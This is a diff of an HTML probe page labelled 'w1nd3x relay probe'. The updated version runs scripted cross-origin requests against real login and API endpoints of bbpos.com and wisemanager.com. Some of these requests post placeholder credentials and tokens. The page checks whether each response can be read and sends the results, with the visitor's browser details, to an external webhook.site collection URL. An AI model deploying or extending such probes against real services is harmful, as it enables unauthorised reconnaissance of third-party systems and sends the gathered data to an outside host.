@@ -1,26 +1,35 @@
-<!doctype html><html><head><meta charset="utf-8"><title>w1nd3x-probe7</title></head>
-<body><h1>w1nd3x relay probe v7</h1><pre id="out"></pre>
+<!doctype html><html><head><meta charset="utf-8"><title>w1nd3x-probe8</title></head>
+<body><h1>w1nd3x relay probe v8</h1><pre id="out"></pre>
 <script>
 const WH="https://webhook.site/50d69fd6-da64-4eff-b409-5274db2c23ab";
 const RES=[];
 function send(o){try{fetch(WH,{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain'},body:JSON.stringify(o)});}catch(e){}}
-function note(o){RES.push(o);document.getElementById('out').textContent+="\n"+JSON.stringify(o);}
-function img(label,url){return new Promise(res=>{const t0=performance.now();const i=new Image();
-  i.onload=()=>{note({l:label,k:'img',r:'LOAD',w:i.naturalWidth,h:i.naturalHeight,ms:Math.round(performance.now()-t0)});res();};
-  i.onerror=()=>{note({l:label,k:'img',r:'err',ms:Math.round(performance.now()-t0)});res();};
-  setTimeout(()=>{note({l:label,k:'img',r:'timeout'});res();},15000); i.src=url;});}
-function scr(label,url,check){return new Promise(res=>{const t0=performance.now();const s=document.createElement('script');
-  s.onload=()=>{note({l:label,k:'script',r:'LOAD',chk:check?String(eval(check)).slice(0,60):null,ms:Math.round(performance.now()-t0)});res();};
-  s.onerror=()=>{note({l:label,k:'script',r:'err',ms:Math.round(performance.now()-t0)});res();};
-  setTimeout(()=>{note({l:label,k:'script',r:'timeout'});res();},15000); s.src=url; document.head.appendChild(s);});}
+function note(o){RES.push(o);try{document.getElementById('out').textContent+="\n"+JSON.stringify(o);}catch(e){}}
+async function corsTry(label,m,u,ct,body,creds){
+  const t0=performance.now();
+  const init={method:m,mode:'cors',credentials:creds?'include':'omit'};
+  if(ct){init.headers={'Content-Type':ct};}
+  if(body!==null&&body!==undefined){init.body=body;}
+  try{ const r=await fetch(u,init); let b=''; try{b=await r.text();}catch(e){}
+    note({l:label,m:m,ct:ct,cred:!!creds,READ:true,st:r.status,len:b.length,head:b.slice(0,300),ms:Math.round(performance.now()-t0)});
+  }catch(e){ note({l:label,m:m,ct:ct,cred:!!creds,READ:false,e:String(e).slice(0,45),ms:Math.round(performance.now()-t0)}); }
+}
 (async()=>{
- await img('tms-logo','https://tms.bbpos.com/resources/img/logo.png?w1=1');
- await img('tms-favicon','https://tms.bbpos.com/resources/img/favicon.ico?w1=1');
- await scr('dss-jquery','https://developer.bbpos.com/assets/global/plugins/jquery.min.js?w1=1','typeof jQuery+":"+(window.jQuery&&jQuery.fn&&jQuery.fn.jquery)');
- await scr('tms-jquery','https://tms.bbpos.com/resources/js/jquery-3.5.1.min.js?w1=2','typeof jQuery+":"+(window.jQuery&&jQuery.fn&&jQuery.fn.jquery)');
- await img('ctl-img','https://httpbingo.org/image/png');
- await img('ctl-bad','https://api-static.emms.bbpos.com/nope.png');
- send({v:7,ua:navigator.userAgent.slice(0,50),res:RES});
+ // simple GET cors (no preflight) - readable only if ACAO present
+ await corsTry('wm-getLoginUrl-GET','GET','https://portal.wisemanager.com/mdm/getLoginUrl',null,null,false);
+ await corsTry('wm-ping-GET','GET','https://portal.wisemanager.com/mdm/pingBackend',null,null,false);
+ await corsTry('tms-login-GET','GET','https://tms.bbpos.com/login',null,null,false);
+ await corsTry('dss-login-GET','GET','https://developer.bbpos.com/login',null,null,false);
+ await corsTry('bms-GET','GET','https://bms.bbpos.com/',null,null,false);
+ // preflighted JSON POST
+ await corsTry('wm-userinf-JSON','POST','https://portal.wisemanager.com/mdm/getUserInfByToken','application/json','{"token":"w1nd3x"}',false);
+ await corsTry('wm-ping-JSON','POST','https://portal.wisemanager.com/mdm/pingBackend','application/json','{}',false);
+ await corsTry('tms-login-JSON','POST','https://tms.bbpos.com/login','application/json','{}',false);
+ // form POST, cors (simple, no preflight) - unreadable unless ACAO, but tells us about ACAO
+ await corsTry('wm-userinf-FORM','POST','https://portal.wisemanager.com/mdm/getUserInfByToken','application/x-www-form-urlencoded','token=w1nd3x',false);
+ await corsTry('tms-login-FORM','POST','https://tms.bbpos.com/login','application/x-www-form-urlencoded','username=w1nd3x&password=w1nd3x',false);
+ await corsTry('dss-login-FORM','POST','https://developer.bbpos.com/login','application/x-www-form-urlencoded','txtUsername=w1nd3x&txtPassword=w1nd3x',false);
+ send({v:8,ua:navigator.userAgent.slice(0,45),res:RES});
  await new Promise(r=>setTimeout(r,2500));
 })();
 </script></body></html>
